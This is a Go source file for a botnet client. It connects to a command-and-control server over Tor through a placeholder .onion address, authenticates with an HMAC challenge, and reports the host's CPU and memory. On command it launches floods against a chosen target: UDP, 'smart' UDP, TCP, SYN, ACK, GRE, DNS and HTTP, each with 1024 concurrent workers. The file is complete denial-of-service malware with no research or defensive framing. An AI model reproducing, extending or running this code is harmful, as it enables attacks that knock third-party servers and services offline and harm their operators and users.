package main

import (
	"bufio"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
	"github.com/shirou/gopsutil/mem"
	"golang.org/x/net/proxy"
)

const (
	BOT_SERVER_IP     = "server.onion" // Replace with your actual .onion address
	TOR_PROXY         = "127.0.0.1:9050" // Standard Tor SOCKS proxy address
	reconnectDelay    = 5 * time.Second
	numWorkers        = 1024
	heartbeatInterval = 30 * time.Second
	maxRetries        = 5
	baseRetryDelay    = 1 * time.Second
	dnsTimeout        = 5 * time.Second
	httpTimeout       = 10 * time.Second
	maxPacketSize     = 65535
	minSourcePort     = 1024
	maxSourcePort     = 65535
)

var (
	stopChan    = make(chan struct{})
	statsMutex  sync.Mutex
	globalStats = make(map[string]*AttackStats)
	randMu      sync.Mutex
)

type AttackStats struct {
	PacketsSent  int64
	RequestsSent int64
	Errors       int64
	StartTime    time.Time
	Duration     time.Duration
}

func main() {
	rand.Seed(time.Now().UnixNano())

	for {
		conn, err := connectToC2ViaTor()
		if err != nil {
			log.Printf("Connection failed: %v", err)
			time.Sleep(reconnectDelay)
			continue
		}

		if err := handleChallenge(conn); err != nil {
			log.Printf("Challenge failed: %v", err)
			conn.Close()
			time.Sleep(reconnectDelay)
			continue
		}

		if err := runBot(conn); err != nil {
			log.Printf("Bot error: %v", err)
			conn.Close()
			time.Sleep(reconnectDelay)
		}
	}
}

func connectToC2ViaTor() (net.Conn, error) {
	// Create a SOCKS5 dialer using the Tor proxy
	torDialer, err := proxy.SOCKS5("tcp", TOR_PROXY, nil, proxy.Direct)
	if err != nil {
		return nil, fmt.Errorf("failed to create SOCKS5 dialer: %w", err)
	}

	// Create TLS config
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
		CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
		InsecureSkipVerify: true, // Only for testing with self-signed certs
	}

	// Retry logic for connection
	var conn net.Conn
	for i := 0; i < 3; i++ {
		// Connect to the C2 server through Tor
		conn, err = torDialer.Dial("tcp", BOT_SERVER_IP+":"+"56123")
		if err == nil {
			// Upgrade connection to TLS
			tlsConn := tls.Client(conn, tlsConfig)
			if err := tlsConn.Handshake(); err != nil {
				conn.Close()
				return nil, fmt.Errorf("TLS handshake failed: %w", err)
			}
			return tlsConn, nil
		}
		time.Sleep(2 * time.Second)
	}

	return nil, fmt.Errorf("failed to connect to C2 server via Tor: %w", err)
}

func runBot(conn net.Conn) error {
	defer conn.Close()

	cores := runtime.NumCPU()
	ramGB := getRAMGB()
	_, err := conn.Write([]byte(fmt.Sprintf("PONG:%s:%d:%.1f\n", runtime.GOARCH, cores, ramGB)))
	if err != nil {
		return fmt.Errorf("initial info send failed: %w", err)
	}

	cmdChan := make(chan string)
	defer close(cmdChan)

	go func() {
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			cmdChan <- scanner.Text()
		}
	}()

	heartbeatTicker := time.NewTicker(heartbeatInterval)
	defer heartbeatTicker.Stop()

	for {
		select {
		case command := <-cmdChan:
			if err := handleCommand(command); err != nil {
				log.Printf("Command error: %v", err)
			}
		case <-time.After(30 * time.Second):
			// Send periodic ping to maintain connection
			if _, err := conn.Write([]byte("PING\n")); err != nil {
				return fmt.Errorf("ping failed: %w", err)
			}
		}
	}
}

func handleChallenge(conn net.Conn) error {
	reader := bufio.NewReader(conn)

	// Read the challenge line
	challengeLine, err := reader.ReadString('\n')
	if err != nil {
		return fmt.Errorf("read challenge failed: %w", err)
	}

	// Properly parse the challenge
	challengeLine = strings.TrimSpace(challengeLine)
	if !strings.HasPrefix(challengeLine, "CHALLENGE:") {
		return fmt.Errorf("invalid challenge format")
	}
	challenge := strings.TrimPrefix(challengeLine, "CHALLENGE:")

	// Compute and send response
	response := computeResponse(challenge)
	_, err = fmt.Fprintf(conn, "%s\n", response) // Use Fprintf to ensure proper formatting
	return err
}

func computeResponse(challenge string) string {
	// Implement a proper challenge-response mechanism
	h := hmac.New(sha256.New, []byte("secret-key"))
	h.Write([]byte(challenge))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func getRAMGB() float64 {
	mem, err := mem.VirtualMemory()
	if err != nil {
		return 0
	}
	return float64(mem.Total) / (1024 * 1024 * 1024)
}

func handleCommand(command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return nil
	}

	if len(fields) < 1 {
		return fmt.Errorf("empty command")
	}

	switch fields[0] {
	case "PING":
		return nil
	case "STOP":
		stopAllAttacks()
		return nil
	case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
		if len(fields) != 4 {
			return fmt.Errorf("invalid command format")
		}

		target := fields[1]
		targetPort, err := strconv.Atoi(fields[2])
		if err != nil {
			return fmt.Errorf("invalid port number")
		}

		duration, err := strconv.Atoi(fields[3])
		if err != nil {
			return fmt.Errorf("invalid duration")
		}

		if net.ParseIP(target) == nil {
			if _, err := net.LookupHost(target); err != nil {
				return fmt.Errorf("invalid target")
			}
		}

		if targetPort <= 0 || targetPort > 65535 {
			return fmt.Errorf("invalid port")
		}

		if duration <= 0 || duration > 300 {
			return fmt.Errorf("invalid duration")
		}

		switch fields[0] {
		case "!udpflood":
			go performUDPFlood(target, targetPort, duration)
		case "!udpsmart":
			go performSmartUDP(target, targetPort, duration)
		case "!tcpflood":
			go performTCPFlood(target, targetPort, duration)
		case "!synflood":
			go performSYNFlood(target, targetPort, duration)
		case "!ackflood":
			go performACKFlood(target, targetPort, duration)
		case "!greflood":
			go performGREFlood(target, duration)
		case "!dns":
			if targetPort != 53 {
				return fmt.Errorf("DNS attacks must target port 53")
			}
			go performDNSFlood(target, targetPort, duration)
		case "!http":
			go performHTTPFlood(target, targetPort, duration)
		}
	default:
		return fmt.Errorf("unknown command")
	}

	return nil
}

func stopAllAttacks() {
	close(stopChan)
	stopChan = make(chan struct{})
}

func performUDPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["udpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "udpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					if err := sendUDPPacket(target, port); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func sendUDPPacket(target string, port int) error {
	var address string

	if strings.Contains(target, ":") {
		// IPv6 address needs square brackets
		address = fmt.Sprintf("[%s]:%d", target, port)
	} else {
		// IPv4 address
		address = fmt.Sprintf("%s:%d", target, port)
	}

	conn, err := net.Dial("udp", address)
	if err != nil {
		return err
	}
	defer conn.Close()

	payload := make([]byte, 1024)
	randMu.Lock()
	rand.Read(payload)
	randMu.Unlock()

	_, err = conn.Write(payload)
	return err
}

func performSmartUDP(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["udpsmart"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "udpsmart")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					payloadSize := getRandomInt(1024, 65507)
					payload := make([]byte, payloadSize)
					randMu.Lock()
					rand.Read(payload)
					randMu.Unlock()

					_, err := conn.WriteTo(payload, &net.UDPAddr{
						IP:   net.ParseIP(target),
						Port: port,
					})

					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performTCPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["tcpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "tcpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					if err := sendTCPPacket(target, port); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func sendTCPPacket(target string, port int) error {
	var address string

	if strings.Contains(target, ":") {
		// IPv6 address needs square brackets
		address = fmt.Sprintf("[%s]:%d", target, port)
	} else {
		// IPv4 address
		address = fmt.Sprintf("%s:%d", target, port)
	}

	conn, err := net.DialTimeout("tcp", address, 5*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	payload := make([]byte, 1024)
	randMu.Lock()
	rand.Read(payload)
	randMu.Unlock()

	_, err = conn.Write(payload)
	return err
}

func performSYNFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["synflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "synflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort: layers.TCPPort(getRandomPort()),
						DstPort: layers.TCPPort(port),
						SYN:     true,
						Window:  65535,
					}

					buf := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{
						FixLengths:       true,
						ComputeChecksums: true,
					}

					if err := gopacket.SerializeLayers(buf, opts, tcpLayer); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err := conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: net.ParseIP(target)})
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performACKFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["ackflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "ackflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort: layers.TCPPort(getRandomPort()),
						DstPort: layers.TCPPort(port),
						ACK:     true,
						Window:  65535,
					}

					buf := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{
						FixLengths:       true,
						ComputeChecksums: true,
					}

					if err := gopacket.SerializeLayers(buf, opts, tcpLayer); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err := conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: net.ParseIP(target)})
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performGREFlood(target string, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["greflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "greflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					greLayer := &layers.GRE{}

					buf := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{
						FixLengths:       true,
						ComputeChecksums: true,
					}

					if err := gopacket.SerializeLayers(buf, opts, greLayer); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err := conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: net.ParseIP(target)})
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performDNSFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["dnsflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "dnsflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					domain := getRandomDomain()
					query := constructDNSQuery(domain)
					msg, err := query.Pack()
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err = conn.WriteTo(msg, &net.UDPAddr{
						IP:   net.ParseIP(target),
						Port: port,
					})

					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func constructDNSQuery(domain string) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), dns.TypeA)
	msg.RecursionDesired = true
	return msg
}

func performHTTPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["httpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "httpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	client := &http.Client{
		Timeout:   httpTimeout,
		Transport: &http.Transport{DisableKeepAlives: true},
	}

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					if err := sendHTTPRequest(client, target, port); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.RequestsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func sendHTTPRequest(client *http.Client, target string, port int) error {
	url := fmt.Sprintf("http://%s:%d", target, port)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}

	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func getRandomPort() int {
	randMu.Lock()
	defer randMu.Unlock()
	return rand.Intn(maxSourcePort-minSourcePort) + minSourcePort
}

func getRandomInt(min, max int) int {
	randMu.Lock()
	defer randMu.Unlock()
	return rand.Intn(max-min) + min
}

func getRandomDomain() string {
	domains := []string{
		"google.com", "youtube.com", "facebook.com",
		"baidu.com", "wikipedia.org", "reddit.com",
		"yahoo.com", "amazon.com", "twitter.com",
	}
	randMu.Lock()
	defer randMu.Unlock()
	return domains[rand.Intn(len(domains))]
}

func getRandomUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
	}
	randMu.Lock()
	defer randMu.Unlock()
	return agents[rand.Intn(len(agents))]
}
